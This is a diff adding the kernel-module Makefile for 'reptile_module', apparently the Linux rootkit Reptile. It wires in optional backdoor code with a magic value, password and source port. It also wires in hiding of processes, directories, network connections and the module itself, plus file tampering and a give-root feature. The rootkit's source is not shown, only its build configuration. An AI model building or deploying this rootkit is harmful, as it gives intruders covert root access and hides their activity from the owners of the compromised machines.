@@ -1,0 +1,39 @@
+MODNAME		                        ?= reptile_module
+CONFIG_FILE                         := $(src)/../.config
+
+include $(CONFIG_FILE)
+
+ccflags-y	                        += -I$(src)/include -Werror -fno-stack-protector -fomit-frame-pointer
+ldflags-y	                        += -T$(src)/khook/engine.lds
+
+obj-m		                        += $(MODNAME).o
+$(MODNAME)-y	                    += main.o string_helpers.o util.o
+
+$(MODNAME)-$(CONFIG_BACKDOOR)       += backdoor.o
+$(MODNAME)-$(CONFIG_HIDE_PROC)      += proc.o
+$(MODNAME)-$(CONFIG_HIDE_DIR)       += dir.o
+$(MODNAME)-$(CONFIG_FILE_TAMPERING) += file.o
+$(MODNAME)-$(CONFIG_HIDE_CONN)      += network.o
+$(MODNAME)-$(CONFIG_AUTO_HIDE)      += module.o
+
+ccflags-$(CONFIG_BACKDOOR)          += -DCONFIG_BACKDOOR
+ccflags-$(CONFIG_BACKDOOR)          += -DMAGIC_VALUE=\"$(MAGIC_VALUE)\"
+ccflags-$(CONFIG_BACKDOOR)          += -DPASSWORD=\"$(PASSWORD)\"
+ccflags-$(CONFIG_BACKDOOR)          += -DSRCPORT=$(SRCPORT)
+
+ccflags-$(CONFIG_FILE_TAMPERING)    += -DCONFIG_FILE_TAMPERING
+ccflags-$(CONFIG_FILE_TAMPERING)    += -DTAG_NAME=\"$(TAG_NAME)\"
+
+ccflags-$(CONFIG_HIDE_DIR)          += -DCONFIG_HIDE_DIR
+ccflags-$(CONFIG_HIDE_DIR)          += -DHIDE=\"$(HIDE)\"
+
+ccflags-$(CONFIG_HIDE_PROC)         += -DCONFIG_HIDE_PROC
+ccflags-$(CONFIG_HIDE_CONN)         += -DCONFIG_HIDE_CONN
+ccflags-$(CONFIG_AUTO_HIDE)         += -DCONFIG_AUTO_HIDE
+ccflags-$(CONFIG_GIVE_ROOT)         += -DCONFIG_GIVE_ROOT
+
+ccflags-y                           += -DAUTH=$(AUTH)
+ccflags-y                           += -DHTUA=$(HTUA)
+
+KBUILD_CFLAGS	                    := $(filter-out -pg,$(KBUILD_CFLAGS))
+KBUILD_CFLAGS	                    := $(filter-out -mfentry,$(KBUILD_CFLAGS))
